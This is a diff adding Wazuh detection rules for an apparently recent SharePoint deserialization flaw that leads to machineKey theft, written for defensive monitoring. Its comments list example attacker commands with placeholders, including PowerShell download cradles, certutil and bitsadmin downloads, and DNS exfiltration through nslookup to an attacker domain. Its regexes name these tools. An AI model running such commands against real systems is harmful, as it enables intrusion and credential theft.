@@ -1,0 +1,414 @@
+<!-- ============================================================
+     Microsoft SharePoint Server Deserialization RCE - Machine Key Theft
+     CVE-2026-50522 (CWE-502: Deserialization of Untrusted Data)
+     Affected: SharePoint Enterprise Server 2016, SharePoint Server 2019,
+               SharePoint Server Subscription Edition
+     MITRE ATT&amp;CK:
+       T1190     - Exploit Public-Facing Application (TA0001 Initial Access)
+       T1059.001 - Command and Scripting Interpreter: PowerShell (TA0002 Execution)
+       T1059.003 - Command and Scripting Interpreter: Windows Command Shell
+       T1105     - Ingress Tool Transfer (TA0011 C2)
+       T1505.003 - Server Software Component: Web Shell (TA0003 Persistence)
+       T1539     - Steal Web Session Cookie (TA0006 Credential Access)
+       T1552.001 - Credentials In Files (TA0006 Credential Access)
+     CISA KEV: Not yet added as of 2026-07-22; active exploitation confirmed
+     Rule IDs: 104145-104151
+     Author: SecOps Engineer (Purple Team)
+     Date: 2026-07-22
+     Related: CVE-2026-58644 (rules 103979-103985, same attack surface)
+
+     Vulnerability Summary:
+
+     CVE-2026-50522 is a critical-severity (CVSS 9.8) deserialization of
+     untrusted data vulnerability in Microsoft SharePoint Server, disclosed
+     July 14 2026 (Patch Tuesday). Active exploitation in the wild was
+     confirmed by watchTowr on July 22 2026, following public PoC release.
+
+     The vulnerability shares the same .NET deserialization attack surface as
+     CVE-2026-58644 but introduces a uniquely dangerous capability: a single
+     unauthenticated HTTP POST to /_layouts/15/Authenticate.aspx extracts the
+     SharePoint server's ASP.NET machineKey (validationKey + decryptionKey)
+     from the running application context. Possession of the machineKey allows
+     an attacker to forge arbitrary ViewState payloads that the .NET runtime
+     accepts and deserializes with full CLR trust, enabling remote code
+     execution on any subsequent request with NO further exploitation required.
+
+     Critically, the machineKey persists after patching when the patch does not
+     rotate the key. An attacker who steals the machineKey before patching retains
+     persistent RCE capability against the patched server indefinitely, making
+     early detection of the theft event essential.
+
+     Attack Chain:
+
+       1. Reconnaissance: Attacker confirms SharePoint version and build via
+          /_api/contextinfo, /_vti_bin/sitedata.asmx, or HTTP response headers.
+          Version-specific deserialization gadget chains are selected.
+       2. Machine Key Theft (single request): Attacker sends an unauthenticated
+          HTTP POST to /_layouts/15/Authenticate.aspx containing a serialized
+          .NET payload crafted to extract the ASP.NET machineKey configuration
+          from SharePoint's HttpContext or System.Web.Security internals. The
+          server processes the deserialization, executes attacker-controlled
+          code within the application context, and the gadget chain reads and
+          exfiltrates the machineKey via OOB DNS/HTTP callback or encodes it
+          into the HTTP response. A successful theft produces a single HTTP
+          200 response where the body contains the base64-encoded machineKey
+          values or triggers an observable OOB callback.
+       3. RCE via Forged ViewState: Armed with the machineKey, the attacker
+          crafts a malicious __VIEWSTATE parameter signed and encrypted with
+          the stolen key. When submitted to any SharePoint page that processes
+          ViewState, the .NET runtime deserializes the payload and executes
+          the embedded gadget chain. This path does NOT require exploiting
+          CVE-2026-50522 a second time; the machineKey alone is sufficient.
+       4. Post-Exploitation: Common second-stage actions observed:
+          - PowerShell download cradle (w3wp.exe spawning powershell.exe -enc)
+          - Cobalt Strike BEACON or similar implant staging
+          - Webshell drop to /_layouts/, /_vti_bin/, or inetpub directories
+          - Host enumeration (whoami, ipconfig, nltest) for lateral movement
+          - LOLBin download (certutil, bitsadmin) for second-stage payload retrieval
+
+     Relationship to CVE-2026-58644:
+
+     Both CVEs exploit .NET deserialization in on-premises SharePoint but differ
+     in attack path and persistence mechanism:
+
+       CVE-2026-58644: Generic pre-auth deserialization via /_vti_bin/ or
+         /_layouts/ endpoints. RCE requires each exploit attempt to succeed.
+         Detection window: each exploit attempt.
+       CVE-2026-50522: Targets /_layouts/15/Authenticate.aspx specifically.
+         Single-request machineKey theft grants PERSISTENT RCE capability.
+         Detection window: the initial theft request (one-time; post-patch
+         attacks using stolen key are NOT covered by CVE-2026-50522 detection
+         alone; they require ViewState deserialization detections).
+
+     Detection Layers:
+
+     Layer 1 - Process Execution (Sysmon EventID 1, Wazuh SID 61603):
+       Rule 104145 (level 0): Silent base anchor - w3wp.exe spawning any child
+         process in the context of CVE-2026-50522. Silent; all Layer 1 child
+         rules depend on this anchor via if_sid.
+       Rule 104146 (level 14): w3wp.exe spawning PowerShell, pwsh, or .NET
+         compiler (csc.exe, vbc.exe). First-stage post-RCE actions from
+         machineKey-forged ViewState deserialization. Near-certain true positive.
+       Rule 104147 (level 13): w3wp.exe spawning download/staging LOLBins
+         (certutil, bitsadmin, mshta, wscript, cscript, curl, wget). Second-stage
+         payload retrieval following initial RCE via machineKey ViewState forgery.
+       Rule 104148 (level 12): w3wp.exe spawning OOB callback or recon utilities
+         (nslookup, ping, whoami, ipconfig, nltest, net). Covers both machine
+         key exfiltration via DNS OOB callback and post-exploit host enumeration.
+
+     Layer 2 - File Creation (Sysmon EventID 11):
+       Rule 104149 (level 15): w3wp.exe creating an ASPX, ASMX, ASHX, or SVC
+         file. Persistent webshell deployment following machineKey-enabled RCE.
+         Near-zero false positive rate. Requires immediate incident response.
+
+     Layer 3 - HTTP / Traefik reverse proxy (JSON access logs):
+       Rule 104150 (level 9): POST to /_layouts/15/Authenticate.aspx -
+         primary CVE-2026-50522 exploitation endpoint. Acts as HTTP-layer anchor.
+         Alert volume is low to moderate; Authenticate.aspx sees limited POST
+         traffic in normal SharePoint operation compared to REST/SOAP endpoints.
+       Rule 104151 (level 11): Child of 104150 - POST to Authenticate.aspx
+         returning HTTP 5xx. A deserialization exception before gadget chain
+         completion surfaces as 500. Repeated 500s from the same source IP
+         indicate active exploit probing or gadget chain refinement.
+
+     Log Source Prerequisites:
+       Process/File layer (rules 104145-104149): Sysmon installed on Windows
+         hosts running IIS/SharePoint with EventID 1 (Process Creation) and
+         EventID 11 (File Created) enabled. Wazuh Sysmon integration assigns
+         SID 61603 for Sysmon EventID 1. File-creation rule (104149) uses
+         decoded_as=json with win.eventdata.eventID field matching.
+       HTTP layer (rules 104150-104151): Traefik access logs in JSON format
+         forwarded to Wazuh. Field names follow Traefik v2+ JSON log defaults:
+         RequestMethod, RequestPath, RequestHost, DownstreamStatus, ClientHost.
+
+     Severity Tiers:
+        0 - Process anchor (silent, correlation parent only)
+       14 - w3wp.exe spawning PowerShell or .NET compiler (near-certain RCE)
+       13 - w3wp.exe spawning download/staging LOLBins (payload staging)
+       12 - w3wp.exe spawning OOB/recon tools (DNS OOB callback or enumeration)
+       15 - w3wp.exe creating web script file (webshell drop, critical)
+        9 - HTTP POST to Authenticate.aspx (anchor, low-volume alert)
+       11 - HTTP POST to Authenticate.aspx returning 5xx (exploit probe)
+
+     False Positive Guidance:
+       104145: Generic w3wp.exe child process anchor. Benign IIS maintenance
+         tasks may spawn child processes during app pool recycling. The specific
+         child process types targeted by 104146-104148 have no legitimate
+         operational explanation in a SharePoint AppPool context.
+       104146: PowerShell or .NET compiler from w3wp.exe has no legitimate
+         operational justification in standard SharePoint deployments. Any match
+         should be treated as confirmed RCE and escalated immediately.
+       104147: Download LOLBins from w3wp.exe are unexpected in production.
+         Staging or CI environments running automated deployment tools may
+         trigger; baseline source host and user context.
+       104148: nslookup/ping from w3wp.exe may occur in custom SharePoint apps
+         performing DNS health checks for internal services. Correlate destination
+         domain: known-internal destinations are likely benign; external or
+         randomly-named domains indicate OOB DNS machineKey exfiltration callbacks.
+       104149: Near-zero false positive rate. w3wp.exe writing web script files
+         is not a routine SharePoint operation. Any match requires immediate IR.
+       104150: Authenticate.aspx receives legitimate POST traffic for forms-based
+         authentication (FBA) in on-premises SharePoint deployments using
+         FBA providers. Volume is lower than /_vti_bin/ endpoints. Alert on
+         unusual source IPs, off-hours traffic, or high-frequency posting from
+         a single source.
+       104151: HTTP 500 from Authenticate.aspx may occur for malformed FBA
+         credentials or misconfigured membership providers. Meaningful signal
+         when: (a) same source IP generates multiple 500s across a short window,
+         (b) no prior authenticated session exists for that IP, or (c) correlated
+         with host-side w3wp.exe child process events (104146-104148).
+     ============================================================ -->
+
+<group name="initial_access,exploit_pubfacing,sharepoint,cve_2026_50522,machinekey_theft,">
+
+  <!-- ===========================================================
+       Layer 1: Process Execution (Sysmon EventID 1 -> Wazuh SID 61603)
+       Rule IDs: 104145-104148
+
+       CVE-2026-50522 achieves code execution within the SharePoint IIS
+       application pool (w3wp.exe) via forged ViewState payloads signed with
+       the stolen machineKey. All post-exploitation process activity originates
+       as w3wp.exe children. The silent anchor (104145) correlates parent-child
+       process relationships; severity-bearing child rules (104146-104148) fire
+       on specific child process types with no legitimate operational justification
+       in a production SharePoint IIS AppPool context.
+       =========================================================== -->
+
+  <!-- Base anchor: w3wp.exe spawning any child process (silent, level 0).
+
+       SharePoint runs in IIS worker processes (w3wp.exe). Under normal
+       operation the AppPool executes .NET managed code internally without
+       spawning external child processes. Any child process spawned by
+       w3wp.exe is anomalous and warrants inspection. This silent anchor
+       at level 0 generates no alert itself; it is the if_sid parent for
+       rules 104146-104148, enabling severity escalation based on the
+       specific child process type.
+
+       Distinguished from CVE-2026-58644 anchor (103979) by group membership
+       (cve_2026_50522); both anchors fire on the same SID 61603 events,
+       ensuring parallel detection coverage regardless of which CVE is being
+       exploited. -->
+  <rule id="104145" level="0">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\w3wp\.exe$</field>
+    <description>SharePoint CVE-2026-50522: w3wp.exe spawned child process $(win.eventdata.image) on $(win.eventdata.computer) (base anchor for machineKey theft RCE detection)</description>
+    <group>sharepoint,cve_2026_50522,iis_worker,</group>
+  </rule>
+
+  <!-- w3wp.exe spawning PowerShell, pwsh, or .NET compiler.
+
+       PowerShell (powershell.exe, pwsh.exe) and the Roslyn C# compiler
+       (csc.exe, vbc.exe) are the primary first-stage post-exploitation
+       tools invoked by .NET deserialization gadget chains executing via
+       machineKey-forged ViewState. Typical patterns observed in the wild:
+
+         - powershell.exe -enc <base64>   : download cradle for reverse shell
+         - powershell.exe -nop -w hidden  : Cobalt Strike stager
+         - csc.exe /out:<tmp>.dll         : in-memory C# compilation of implant
+
+       Because CVE-2026-50522 enables RCE via machineKey ViewState forgery on
+       any page (not just the Authenticate.aspx entry point), post-exploit
+       commands may originate from a different SharePoint page request than
+       the initial theft. This rule fires on any w3wp.exe PowerShell/compiler
+       spawn regardless of which SharePoint endpoint triggered deserialization. -->
+  <rule id="104146" level="14">
+    <if_sid>104145</if_sid>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\(powershell|pwsh|csc|vbc|jsc)\.exe$</field>
+    <description>SharePoint CVE-2026-50522: w3wp.exe spawned $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user) -- near-certain RCE via machineKey ViewState forgery; PowerShell download cradle or .NET in-memory compilation; machineKey may have been stolen in a prior single-request exploit; initiate incident response and rotate machineKey (T1190/T1059.001)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1059.001</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,rce,powershell,high_confidence,</group>
+  </rule>
+
+  <!-- w3wp.exe spawning download or staging LOLBins.
+
+       After achieving RCE via machineKey-forged ViewState deserialization,
+       threat actors retrieve second-stage payloads from attacker-controlled
+       infrastructure using native Windows binaries (Living Off The Land Binaries):
+
+         - certutil.exe -urlcache -f <url>    : HTTP download, decodes base64
+         - bitsadmin /transfer <url> <dest>   : BITS download, evades some AV
+         - mshta.exe http://...               : remote HTA payload execution
+         - wscript.exe / cscript.exe          : script execution
+         - curl.exe / wget.exe                : direct HTTP download
+
+       These binaries have no legitimate use as direct children of the SharePoint
+       IIS worker process in production. A match indicates an attacker is staging
+       additional capabilities after initial RCE via machineKey-enabled ViewState. -->
+  <rule id="104147" level="13">
+    <if_sid>104145</if_sid>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\(certutil|bitsadmin|mshta|wscript|cscript|curl|wget)\.exe$</field>
+    <description>SharePoint CVE-2026-50522: w3wp.exe spawned download LOLBin $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user) -- second-stage payload staging after machineKey ViewState RCE; attacker retrieving implant from external infrastructure; rotate machineKey immediately (T1190/T1105)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1105</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,rce,lolbin,payload_staging,</group>
+  </rule>
+
+  <!-- w3wp.exe spawning OOB callback or host-enumeration utilities.
+
+       This rule covers two overlapping detection patterns for CVE-2026-50522:
+
+       1. Machine key exfiltration via DNS OOB callback:
+          The CVE-2026-50522 exploitation gadget chain may use nslookup.exe
+          or ping.exe to exfiltrate the extracted machineKey material via
+          DNS queries to an attacker-controlled resolver. The machineKey value
+          (validationKey, decryptionKey) is encoded into subdomain labels of
+          an attacker-owned domain and resolved, leaking the key without
+          an explicit outbound HTTP connection. This is the most covert
+          exfiltration path and the pattern most directly tied to the
+          machine key theft aspect of this CVE.
+
+          Examples:
+            nslookup.exe <key-prefix>.<attacker-domain>
+            ping.exe -n 1 <encoded-key>.<attacker-domain>
+
+       2. Post-exploit host enumeration:
+          After RCE via machineKey ViewState forgery, attackers conduct rapid
+          host enumeration before lateral movement:
+
+            whoami.exe           : current process identity
+            hostname.exe         : system hostname
+            ipconfig.exe /all    : network configuration and DNS domain
+            nltest.exe /domain_trusts : Active Directory trust enumeration
+            net.exe / net1.exe   : local users, groups, shares, sessions
+            arp.exe -a           : adjacent host discovery
+
+       Correlate nslookup/ping child process command-line arguments with
+       threat intel: external or randomly-named domain targets indicate
+       OOB machineKey exfiltration rather than legitimate DNS health checks. -->
+  <rule id="104148" level="12">
+    <if_sid>104145</if_sid>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\(nslookup|ping|hostname|whoami|ipconfig|nltest|net|net1|arp|tracert|systeminfo|tasklist)\.exe$</field>
+    <description>SharePoint CVE-2026-50522: w3wp.exe spawned $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user) -- OOB machineKey exfiltration or post-exploit host enumeration; DNS OOB via nslookup/ping may indicate machineKey values being exfiltrated to attacker-controlled resolver; review child process command-line for external domain targets (T1190/T1552.001)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1552.001</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,rce,oob_callback,machinekey_exfil,enumeration,</group>
+  </rule>
+
+
+  <!-- ===========================================================
+       Layer 2: File Creation (Sysmon EventID 11)
+       Rule ID: 104149
+
+       Web script file creation by the IIS worker process following
+       machineKey-enabled RCE is the clearest indicator of a persistent
+       webshell deployed after machineKey theft. Because the machineKey
+       grants durable RCE capability, attackers commonly deploy a webshell
+       as a backup persistence mechanism to survive machineKey rotation.
+       =========================================================== -->
+
+  <!-- w3wp.exe creating a web script file (webshell drop, critical).
+
+       Sysmon EventID 11 (File Created) captures the image path of the
+       process that created the file. Under normal SharePoint operation
+       w3wp.exe does not create new ASPX, ASMX, ASHX, or SVC files.
+
+       Common webshell deployment paths observed in SharePoint exploitation:
+         - C:\inetpub\wwwroot\wss\VirtualDirectories\...\<name>.aspx
+         - C:\Program Files\Common Files\Microsoft Shared\web server extensions\
+           \LAYOUTS\<name>.aspx
+         - C:\Program Files\Common Files\Microsoft Shared\web server extensions\
+           \isapi\<name>.asmx
+
+       Any file creation event matching this rule requires immediate incident
+       response: identify the created file, analyze for webshell content,
+       remove it, rotate the SharePoint machineKey, audit access logs for
+       subsequent webshell use, and initiate full IR scope assessment.
+
+       win.eventdata.eventID is matched as pcre2 field because some Wazuh
+       Sysmon decoder variants include it as a string in the decoded JSON. -->
+  <rule id="104149" level="15">
+    <decoded_as>json</decoded_as>
+    <field name="win.eventdata.eventID" type="pcre2">^11$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\w3wp\.exe$</field>
+    <field name="win.eventdata.targetFilename" type="pcre2">(?i)\.(aspx|asmx|ashx|svc|cshtml|vbhtml)$</field>
+    <description>SharePoint CVE-2026-50522 CRITICAL: w3wp.exe created web script file $(win.eventdata.targetFilename) on $(win.eventdata.computer) -- WEBSHELL DROP after machineKey theft RCE; attacker deploying persistent backdoor; initiate immediate incident response, isolate host, rotate machineKey, preserve forensic image (T1505.003/T1190)</description>
+    <options>alert_by_email</options>
+    <mitre>
+      <id>T1505.003</id>
+      <id>T1190</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,webshell,persistence,critical,high_confidence,</group>
+  </rule>
+
+
+  <!-- ===========================================================
+       Layer 3: HTTP / Traefik reverse proxy (JSON access logs)
+       Rule IDs: 104150-104151
+
+       CVE-2026-50522 is triggered by an HTTP POST to
+       /_layouts/15/Authenticate.aspx, a SharePoint forms-based
+       authentication (FBA) endpoint accessible without authentication.
+       Unlike CVE-2026-58644 which targets multiple endpoint patterns,
+       CVE-2026-50522 exploitation is concentrated on this specific path.
+
+       This path specificity improves signal-to-noise versus the broader
+       /_vti_bin/ and /_layouts/ patterns used by CVE-2026-58644, but
+       also means that attackers who use alternative entry paths to
+       exercise the stolen machineKey will not trigger these HTTP rules.
+       Pair HTTP-layer detections with process-layer rules (104145-104148)
+       for complete coverage across both the theft event and subsequent
+       machineKey-powered RCE.
+       =========================================================== -->
+
+  <!-- POST to Authenticate.aspx: primary CVE-2026-50522 exploit endpoint.
+
+       Fires on any HTTP POST to /_layouts/15/Authenticate.aspx or the
+       site-collection-scoped equivalent (/sites/<name>/_layouts/15/...).
+       This endpoint is the confirmed delivery vector for the single-request
+       machineKey theft. Alert volume is lower than the broader SharePoint
+       endpoint patterns in CVE-2026-58644 rules (103984) because
+       Authenticate.aspx receives limited POST traffic in environments not
+       using SharePoint Forms-Based Authentication providers.
+
+       In FBA-enabled environments, legitimate POST traffic to this path
+       occurs for user login submissions. Correlate source IP, request
+       frequency, and response body size to distinguish FBA login attempts
+       from exploitation: exploitation payloads are typically larger than
+       standard credential submissions and may return unexpected response
+       bodies encoding machineKey material. -->
+  <rule id="104150" level="9">
+    <decoded_as>json</decoded_as>
+    <field name="RequestMethod">POST</field>
+    <field name="RequestPath" type="pcre2">(?i)(?:/_layouts/15/Authenticate\.aspx|/sites/[^/]+/_layouts/15/Authenticate\.aspx)</field>
+    <description>SharePoint CVE-2026-50522: HTTP POST to Authenticate.aspx from $(ClientHost) at $(RequestHost)$(RequestPath) -- primary machineKey theft delivery endpoint; unauthenticated deserialization payload may extract validationKey and decryptionKey in single request; correlate with host-side w3wp.exe process events on SharePoint server (T1190/T1552.001)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1552.001</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,initial_access,exploit_pubfacing,http_probe,machinekey_theft,</group>
+  </rule>
+
+  <!-- POST to Authenticate.aspx returning HTTP 5xx.
+
+       A .NET deserialization exception before the gadget chain completes
+       produces an HTTP 500 Internal Server Error from the SharePoint
+       application pool. Attackers probing CVE-2026-50522 with iterative
+       payload variants (different gadget chains, encoding variations,
+       ysoserial.net chain selection) generate a sequence of 500 responses
+       as they refine the exploit. A single 500 may be a transient SharePoint
+       FBA provider error; repeated 500s from the same source IP against
+       Authenticate.aspx is a strong exploit-probing signal.
+
+       Broader HTTP 5xx range (500-599) is matched: some deserialization
+       exceptions surface as 502 if Traefik receives no upstream response,
+       or 503 if the SharePoint AppPool crashes and IIS returns service
+       unavailable. A 500 from Authenticate.aspx is the canonical
+       exploit-probe response for CVE-2026-50522. -->
+  <rule id="104151" level="11">
+    <if_sid>104150</if_sid>
+    <field name="DownstreamStatus" type="pcre2">^5\d{2}$</field>
+    <description>SharePoint CVE-2026-50522: POST to Authenticate.aspx at $(RequestHost)$(RequestPath) from $(ClientHost) returned HTTP $(DownstreamStatus) -- deserialization exception likely; active machineKey theft probe or gadget chain refinement in progress; check for repeated 5xx from same source IP; correlate with host-side w3wp.exe events (T1190)</description>
+    <mitre>
+      <id>T1190</id>
+    </mitre>
+    <group>sharepoint,cve_2026_50522,initial_access,exploit_pubfacing,deserialization_probe,</group>
+  </rule>
+
+</group>
